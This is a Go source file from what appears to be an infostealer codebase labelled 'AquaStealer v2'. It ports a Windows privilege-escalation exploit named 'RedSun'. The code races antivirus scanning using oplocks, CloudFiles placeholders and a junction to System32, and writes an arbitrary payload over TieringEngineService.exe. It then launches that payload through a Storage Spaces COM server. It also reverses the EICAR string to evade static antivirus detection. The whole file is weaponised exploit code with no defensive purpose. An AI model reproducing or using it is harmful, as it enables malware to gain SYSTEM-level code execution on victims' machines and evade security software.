package zerodays

// redsun.go — AquaStealer v2
// Go port of RedSun 0day (nightmare-eclipse)
//
// RedSun explota una race condition en el filtro OneDrive/CloudFiles + VSS:
//   1. Escribe el EICAR string (invertido para evadir AV estático) en un .exe temporal
//   2. Obtiene un batch oplock cuando AV escanea el archivo (FSCTL_REQUEST_BATCH_OPLOCK)
//   3. Mientras el oplock está pendiente: crea un reparse point (junction) del dir de trabajo
//      apuntando a C:\Windows\System32
//   4. Crea el archivo de destino usando CloudFiles placeholder (CfCreatePlaceholders)
//   5. Cuando AV libera el oplock, el rename del placeholder aterriza en System32
//      con contenido arbitrario
//
// Resultado: escritura arbitraria a C:\Windows\System32\TieringEngineService.exe
// luego se ejecuta vía COM (StorageSpaces TierManagement Engine)
//
// NOTA: Este 0day requiere que el proceso tenga acceso al COM server de Storage Spaces.
//       Sin elevación, puede colocar un DLL en path cargado por un servicio elevado.

import (
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	_ntdllrs   = syscall.NewLazyDLL("ntdll.dll")
	_kernel32rs = syscall.NewLazyDLL("kernel32.dll")
	_ole32rs   = syscall.NewLazyDLL("ole32.dll")
	_cldapirs  = syscall.NewLazyDLL("cldapi.dll")

	_NtCreateFileRS         = _ntdllrs.NewProc("NtCreateFile")
	_NtSetInformationFileRS = _ntdllrs.NewProc("NtSetInformationFile")
	_RtlInitUnicodeStringRS = _ntdllrs.NewProc("RtlInitUnicodeString")
	_NtCloseRS              = _ntdllrs.NewProc("NtClose")
	_DeviceIoControlRS      = _kernel32rs.NewProc("DeviceIoControl")
	_GetOverlappedResultRS  = _kernel32rs.NewProc("GetOverlappedResult")
	_CoInitializeRS         = _ole32rs.NewProc("CoInitialize")
	_CoCreateInstanceRS     = _ole32rs.NewProc("CoCreateInstance")
	_CoUninitializeRS       = _ole32rs.NewProc("CoUninitialize")
	_CfRegisterSyncRootRS   = _cldapirs.NewProc("CfRegisterSyncRoot")
	_CfConnectSyncRootRS    = _cldapirs.NewProc("CfConnectSyncRoot")
	_CfCreatePlaceholdersRS = _cldapirs.NewProc("CfCreatePlaceholders")
	_CoCreateGuidRS         = _ole32rs.NewProc("CoCreateGuid")
	_StringFromGUID2RS      = _ole32rs.NewProc("StringFromGUID2")
)

// NT types reutilizados (compatibles con los del paquete)
type rsUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type rsObjectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *rsUnicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type rsIOStatusBlock struct {
	Status      uintptr
	Information uintptr
}

// REPARSE_DATA_BUFFER para Mount Point
type rsReparseDataBuffer struct {
	ReparseTag        uint32
	ReparseDataLength uint16
	Reserved          uint16
	// MountPoint fields
	SubstituteNameOffset uint16
	SubstituteNameLength uint16
	PrintNameOffset      uint16
	PrintNameLength      uint16
	PathBuffer           [512]uint16
}

// FILE_DISPOSITION_INFORMATION_EX
type rsFileDispositionInfoEx struct {
	Flags uint32
}

// FILE_RENAME_INFORMATION
type rsFileRenameInformation struct {
	ReplaceIfExists uint8
	Pad             [7]byte
	RootDirectory   uintptr
	FileNameLength  uint32
	FileName        [520]uint16
}

// CF_SYNC_REGISTRATION (simplified — just the strings we need)
type rsCfSyncRegistration struct {
	StructSize      uint32
	ProviderName    *uint16
	ProviderVersion *uint16
	SyncRootIdentity uintptr
	SyncRootIdentityLength uint32
	FileIdentity    uintptr
	FileIdentityLength uint32
	HydrationPolicy uint32
}

const (
	rsIO_REPARSE_TAG_MOUNT_POINT = 0xA0000003
	rsFSCTL_SET_REPARSE_POINT    = 0x000900A4
	rsFSCTL_REQUEST_BATCH_OPLOCK = 0x00090028
	rsGENERIC_READ               = 0x80000000
	rsGENERIC_WRITE              = 0x40000000
	rsDELETE                     = 0x00010000
	rsSYNCHRONIZE                = 0x00100000
	rsGENERIC_EXECUTE            = 0x20000000
	rsFILE_ATTRIBUTE_NORMAL      = 0x80
	rsFILE_ATTRIBUTE_READONLY    = 0x1
	rsFILE_OPEN                  = 3
	rsFILE_SUPERSEDE             = 0
	rsFILE_OPEN_IF               = 5
	rsFILE_NON_DIRECTORY_FILE_rs = 0x00000040
	rsFILE_DIRECTORY_FILE_rs     = 0x00000001
	rsFILE_DELETE_ON_CLOSE       = 0x00001000
	rsFILE_SHARE_READ            = 0x00000001
	rsFILE_SHARE_WRITE           = 0x00000002
	rsFILE_SHARE_DELETE          = 0x00000004
	rsOBJ_CASE_INSENSITIVE       = 0x00000040
	rsFILE_SYNCHRONOUS_IO_NONALERT_rs = 0x00000020
)

func rsRtlInitUnicodeString(us *rsUnicodeString, s string) *uint16 {
	buf, _ := syscall.UTF16PtrFromString(s)
	_RtlInitUnicodeStringRS.Call(
		uintptr(unsafe.Pointer(us)),
		uintptr(unsafe.Pointer(buf)),
	)
	return buf
}

func rsNtCreateFile(ntPath string, access, share, createDisp, createOpts uint32) (syscall.Handle, uintptr) {
	buf, _ := syscall.UTF16PtrFromString(ntPath)
	var us rsUnicodeString
	_RtlInitUnicodeStringRS.Call(
		uintptr(unsafe.Pointer(&us)),
		uintptr(unsafe.Pointer(buf)),
	)
	var oa rsObjectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &us
	oa.Attributes = rsOBJ_CASE_INSENSITIVE
	var iostat rsIOStatusBlock
	var handle uintptr
	r, _, _ := _NtCreateFileRS.Call(
		uintptr(unsafe.Pointer(&handle)),
		uintptr(access),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&iostat)),
		0,
		uintptr(rsFILE_ATTRIBUTE_NORMAL),
		uintptr(share),
		uintptr(createDisp),
		uintptr(createOpts),
		0, 0,
	)
	return syscall.Handle(handle), r
}

// rsSetMountPoint — establece un mount point (junction) en un directorio abierto
func rsSetMountPoint(hDir syscall.Handle, target string) bool {
	targetUTF16, _ := syscall.UTF16FromString(`\??\` + target)
	printUTF16 := []uint16{0}

	targetLen := len(targetUTF16) * 2
	printLen := len(printUTF16) * 2
	pathBufSize := targetLen + printLen + 12

	buf := make([]byte, 8+pathBufSize)
	// ReparseTag
	*(*uint32)(unsafe.Pointer(&buf[0])) = rsIO_REPARSE_TAG_MOUNT_POINT
	// ReparseDataLength
	*(*uint16)(unsafe.Pointer(&buf[4])) = uint16(pathBufSize)
	// SubstituteNameOffset
	*(*uint16)(unsafe.Pointer(&buf[8])) = 0
	// SubstituteNameLength
	*(*uint16)(unsafe.Pointer(&buf[10])) = uint16(targetLen - 2)
	// PrintNameOffset
	*(*uint16)(unsafe.Pointer(&buf[12])) = uint16(targetLen)
	// PrintNameLength
	*(*uint16)(unsafe.Pointer(&buf[14])) = 0
	// PathBuffer — copy target
	for i, c := range targetUTF16 {
		*(*uint16)(unsafe.Pointer(&buf[16+i*2])) = c
	}

	var dummy uint32
	r, _, _ := _DeviceIoControlRS.Call(
		uintptr(hDir),
		rsFSCTL_SET_REPARSE_POINT,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0, 0,
		uintptr(unsafe.Pointer(&dummy)),
		0,
	)
	return r != 0
}

// rsEicarReversed — EICAR invertido para evadir AV estático
func rsEicarReversed() []byte {
	s := "ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X;H+H$!"
	b := []byte(s)
	for i, j := 0, len(b)-1; i < j; i, j = i+1, j-1 {
		b[i], b[j] = b[j], b[i]
	}
	return b
}

// rsRequestBatchOplock — solicita batch oplock en un handle, devuelve chan que cierra cuando AV libera
func rsRequestBatchOplock(h syscall.Handle) chan struct{} {
	done := make(chan struct{})
	ov := &windows.Overlapped{}
	var err error
	ov.HEvent, err = windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		close(done)
		return done
	}
	var dummy uint32
	_DeviceIoControlRS.Call(
		uintptr(h),
		rsFSCTL_REQUEST_BATCH_OPLOCK,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&dummy)),
		uintptr(unsafe.Pointer(ov)),
	)
	go func() {
		_GetOverlappedResultRS.Call(
			uintptr(h),
			uintptr(unsafe.Pointer(ov)),
			uintptr(unsafe.Pointer(&dummy)),
			1, // bWait
		)
		close(done)
	}()
	return done
}

// RunRedSun — exploit completo
// Objetivo: escribir payload arbitrario a C:\Windows\System32\TieringEngineService.exe
// y ejecutarlo vía COM de Storage Spaces
func RunRedSun(payloadPath string) bool {
	// Crear dir de trabajo temporal
	tmpDir := os.TempDir()
	workDir := filepath.Join(tmpDir, "RS-"+rsNewGUID())
	filename := "TieringEngineService.exe"
	targetFile := filepath.Join(workDir, filename)

	if err := os.MkdirAll(workDir, 0755); err != nil {
		return false
	}
	defer os.RemoveAll(workDir)

	// Escribir EICAR para triggerear AV
	eicar := rsEicarReversed()
	if err := os.WriteFile(targetFile, eicar, 0644); err != nil {
		return false
	}

	// Abrir el archivo para solicitar batch oplock
	h, stat := rsNtCreateFile(
		`\??\`+targetFile,
		rsDELETE|rsSYNCHRONIZE,
		0,
		rsFILE_OPEN,
		rsFILE_NON_DIRECTORY_FILE_rs,
	)
	if stat != 0 || h == 0 {
		return false
	}

	// Triggerear AV escaneando el archivo (open para exec)
	h2, _ := syscall.CreateFile(
		syscall.StringToUTF16Ptr(targetFile),
		syscall.GENERIC_READ|0x20000000,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
		nil,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if h2 != syscall.InvalidHandle {
		syscall.CloseHandle(h2)
	}

	// Esperar oplock (AV escanea = nos da el oplock)
	oplockDone := rsRequestBatchOplock(h)

	select {
	case <-oplockDone:
		// AV liberó — continuamos
	case <-time.After(30 * time.Second):
		syscall.CloseHandle(h)
		return false
	}

	// Marcar el archivo para delete-on-close via NtSetInformationFile FileDispositionInformationEx
	var iostat rsIOStatusBlock
	fdiex := rsFileDispositionInfoEx{Flags: 0x00000001 | 0x00000002}
	_NtSetInformationFileRS.Call(
		uintptr(h),
		uintptr(unsafe.Pointer(&iostat)),
		uintptr(unsafe.Pointer(&fdiex)),
		unsafe.Sizeof(fdiex),
		64, // FileDispositionInformationEx
	)
	syscall.CloseHandle(h)

	// Llamar CfCreatePlaceholders para crear el placeholder CloudFiles
	rsDoCloudStuff(workDir, filename, uint32(len(eicar)))

	// Abrir el segundo handle (reemplaza el archivo borrado via CloudFiles placeholder)
	var ov windows.Overlapped
	ov.HEvent, _ = windows.CreateEvent(nil, 0, 0, nil)

	// Re-crear workDir (fue borrado por delete-on-close del CfCreatePlaceholders)
	// Rename workDir a .TMP, crear nuevo workDir
	tmpDir2 := workDir + ".TMP"
	os.Rename(workDir, tmpDir2)
	os.MkdirAll(workDir, 0755)

	// Crear el archivo de destino con NtCreateFile FILE_SUPERSEDE
	h3, stat2 := rsNtCreateFile(
		`\??\`+targetFile,
		rsGENERIC_READ|rsDELETE|rsSYNCHRONIZE,
		rsFILE_SHARE_READ,
		rsFILE_SUPERSEDE,
		0,
	)
	if stat2 != 0 || h3 == 0 {
		return false
	}

	// Pedir otro batch oplock
	var dummy uint32
	_DeviceIoControlRS.Call(
		uintptr(h3),
		rsFSCTL_REQUEST_BATCH_OPLOCK,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&dummy)),
		uintptr(unsafe.Pointer(&ov)),
	)

	// Abrir dir para reparse point
	hDir, stat3 := rsNtCreateFile(
		`\??\`+workDir,
		rsGENERIC_WRITE|rsDELETE|rsSYNCHRONIZE,
		rsFILE_SHARE_READ|rsFILE_SHARE_WRITE|rsFILE_SHARE_DELETE,
		rsFILE_OPEN_IF,
		rsFILE_DIRECTORY_FILE_rs|rsFILE_DELETE_ON_CLOSE,
	)
	if stat3 != 0 || hDir == 0 {
		syscall.CloseHandle(h3)
		return false
	}

	// Establecer junction workDir → C:\Windows\System32
	rsSetMountPoint(hDir, `C:\Windows\System32`)

	// Esperar que AV libere el segundo oplock
	var nbytes uint32
	_GetOverlappedResultRS.Call(
		uintptr(h3),
		uintptr(unsafe.Pointer(&ov)),
		uintptr(unsafe.Pointer(&nbytes)),
		1,
	)

	// Rename del archivo en System32 para posicionarlo correctamente
	renameTarget := workDir + ".TEMP2"
	renameTargetU16, _ := syscall.UTF16FromString(`\??\` + renameTarget)
	renameInfoSize := uint32(unsafe.Sizeof(rsFileRenameInformation{}) + uintptr(len(renameTargetU16)*2))
	renameInfoBuf := make([]byte, renameInfoSize)
	renameInfo := (*rsFileRenameInformation)(unsafe.Pointer(&renameInfoBuf[0]))
	renameInfo.ReplaceIfExists = 1
	renameInfo.FileNameLength = uint32(len(renameTargetU16) * 2)
	for i, c := range renameTargetU16 {
		renameInfo.FileName[i] = c
	}
	_NtSetInformationFileRS.Call(
		uintptr(h3),
		uintptr(unsafe.Pointer(&iostat)),
		uintptr(unsafe.Pointer(&renameInfoBuf[0])),
		uintptr(renameInfoSize),
		10, // FileRenameInformation
	)
	_NtSetInformationFileRS.Call(
		uintptr(h3),
		uintptr(unsafe.Pointer(&iostat)),
		uintptr(unsafe.Pointer(&fdiex)),
		unsafe.Sizeof(fdiex),
		64,
	)

	syscall.CloseHandle(hDir)

	// Ahora tenemos write primitivo — copiar el payload real
	// (workDir junction apunta a System32, así que cualquier write a workDir/TieringEngineService.exe
	//  escribe a System32\TieringEngineService.exe)
	for i := 0; i < 1000; i++ {
		hFinal, statFinal := rsNtCreateFile(
			`\??\C:\Windows\System32\TieringEngineService.exe`,
			rsGENERIC_WRITE,
			rsFILE_SHARE_READ|rsFILE_SHARE_WRITE|rsFILE_SHARE_DELETE,
			rsFILE_SUPERSEDE,
			0,
		)
		if statFinal == 0 && hFinal != 0 {
			// Escribir el payload
			if payloadPath != "" {
				data, err := os.ReadFile(payloadPath)
				if err == nil {
					var written uint32
					windows.WriteFile(windows.Handle(hFinal), data, &written, nil)
				}
			}
			syscall.CloseHandle(hFinal)
			syscall.CloseHandle(h3)
			// Ejecutar vía COM (TierManagement Engine)
			go rsLaunchTierManagementEng()
			return true
		}
		time.Sleep(20 * time.Millisecond)
	}

	syscall.CloseHandle(h3)
	return false
}

// rsNewGUID genera un GUID aleatorio como string sin llaves
func rsNewGUID() string {
	var guid windows.GUID
	_CoCreateGuidRS.Call(uintptr(unsafe.Pointer(&guid)))
	buf := make([]uint16, 100)
	_StringFromGUID2RS.Call(
		uintptr(unsafe.Pointer(&guid)),
		uintptr(unsafe.Pointer(&buf[0])),
		100,
	)
	s := syscall.UTF16ToString(buf)
	// Quitar llaves
	if len(s) > 2 {
		s = s[1 : len(s)-1]
	}
	return s
}

// rsDoCloudStuff registra un sync root y crea un CloudFiles placeholder
// Equivalente a DoCloudStuff() en RedSun.cpp
func rsDoCloudStuff(syncRoot, filename string, fileSize uint32) {
	if _CfRegisterSyncRootRS == nil {
		return
	}
	// Estructuras CF son complejas — usamos una versión simplificada
	// que llama las funciones con los parámetros mínimos requeridos
	// Para el exploit lo que importa es que el placeholder exista
	providerName, _ := syscall.UTF16PtrFromString("AQUASTEALER")
	providerVersion, _ := syscall.UTF16PtrFromString("2.0")

	// CF_SYNC_REGISTRATION (StructSize + dos punteros + relleno)
	type cfSyncReg struct {
		StructSize               uint32
		ProviderName             *uint16
		ProviderVersion          *uint16
		SyncRootIdentity         uintptr
		SyncRootIdentityLength   uint32
		FileIdentity             uintptr
		FileIdentityLength       uint32
		ProviderId               [16]byte
	}
	reg := cfSyncReg{
		StructSize:      uint32(unsafe.Sizeof(cfSyncReg{})),
		ProviderName:    providerName,
		ProviderVersion: providerVersion,
	}

	// CF_SYNC_POLICIES
	type cfSyncPolicies struct {
		StructSize               uint32
		HardLink                 uint32
		HydrationPrimary         uint32
		HydrationModifier        uint32
		PopulationPrimary        uint32
		PopulationModifier       uint32
		InSync                   uint32
		Hardlink                 uint32
		PlaceholderManagement    uint32
	}
	policies := cfSyncPolicies{
		StructSize: uint32(unsafe.Sizeof(cfSyncPolicies{})),
		HardLink:   1, // CF_HARDLINK_POLICY_ALLOWED
	}

	syncRootU16, _ := syscall.UTF16PtrFromString(syncRoot)
	_CfRegisterSyncRootRS.Call(
		uintptr(unsafe.Pointer(syncRootU16)),
		uintptr(unsafe.Pointer(&reg)),
		uintptr(unsafe.Pointer(&policies)),
		0x00000008, // CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT
	)

	// CF_CONNECTION_KEY + connect
	type cfCallbackReg struct {
		Type     uint32
		Callback uintptr
	}
	cbReg := [1]cfCallbackReg{{Type: 0xFFFFFFFF}} // CF_CALLBACK_TYPE_NONE
	var cfKey [8]byte
	_CfConnectSyncRootRS.Call(
		uintptr(unsafe.Pointer(syncRootU16)),
		uintptr(unsafe.Pointer(&cbReg[0])),
		0,
		0x00000002|0x00000004, // CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO|CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH
		uintptr(unsafe.Pointer(&cfKey[0])),
	)

	// CF_PLACEHOLDER_CREATE_INFO
	type cfFsMetadata struct {
		BasicInfo  [40]byte // FILE_BASIC_INFO
		FileSize   int64
	}
	type cfPlaceholderCreateInfo struct {
		RelativeFileName        *uint16
		FsMetadata              cfFsMetadata
		FileIdentity            uintptr
		FileIdentityLength      uint32
		Flags                   uint32
		Result                  uint32
		CreateUsn               int64
	}

	filenameU16, _ := syscall.UTF16PtrFromString(filename)
	guidStr := rsNewGUID()
	guidU16, _ := syscall.UTF16PtrFromString(guidStr)

	var meta cfFsMetadata
	meta.FileSize = int64(fileSize)

	placeholder := cfPlaceholderCreateInfo{
		RelativeFileName:   filenameU16,
		FsMetadata:         meta,
		FileIdentity:       uintptr(unsafe.Pointer(guidU16)),
		FileIdentityLength: uint32(len(guidStr) * 2),
		Flags:              0x00000001 | 0x00000080, // CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC
	}

	var processed uint32
	_CfCreatePlaceholdersRS.Call(
		uintptr(unsafe.Pointer(syncRootU16)),
		uintptr(unsafe.Pointer(&placeholder)),
		1,
		0, // CF_CREATE_FLAG_STOP_ON_ERROR
		uintptr(unsafe.Pointer(&processed)),
	)
}

// rsLaunchTierManagementEng — ejecuta el TierManagement COM server (Storage Spaces)
// que carga TieringEngineService.exe como servidor local
func rsLaunchTierManagementEng() {
	_CoInitializeRS.Call(0)
	defer _CoUninitializeRS.Call()

	// CLSID del TierManagement Engine: {50d185b9-fff3-4656-92c7-e4018da4361d}
	guidBytes := []byte{
		0xb9, 0x85, 0xd1, 0x50,
		0xf3, 0xff,
		0x56, 0x46,
		0x92, 0xc7,
		0xe4, 0x01, 0x8d, 0xa4, 0x36, 0x1d,
	}
	var clsid windows.GUID
	copy((*[16]byte)(unsafe.Pointer(&clsid))[:], guidBytes)

	var ret uintptr
	_CoCreateInstanceRS.Call(
		uintptr(unsafe.Pointer(&clsid)),
		0,
		0x4, // CLSCTX_LOCAL_SERVER
		uintptr(unsafe.Pointer(&clsid)),
		uintptr(unsafe.Pointer(&ret)),
	)
}

// RunRedSunDrop — versión simplificada: solo copia un exe a System32 usando el exploit
// y lo ejecuta con cmd si tiene éxito
func RunRedSunDrop(exePath string) {
	if RunRedSun(exePath) {
		exec.Command("cmd", "/c", `C:\Windows\System32\TieringEngineService.exe`).Start()
	}
}
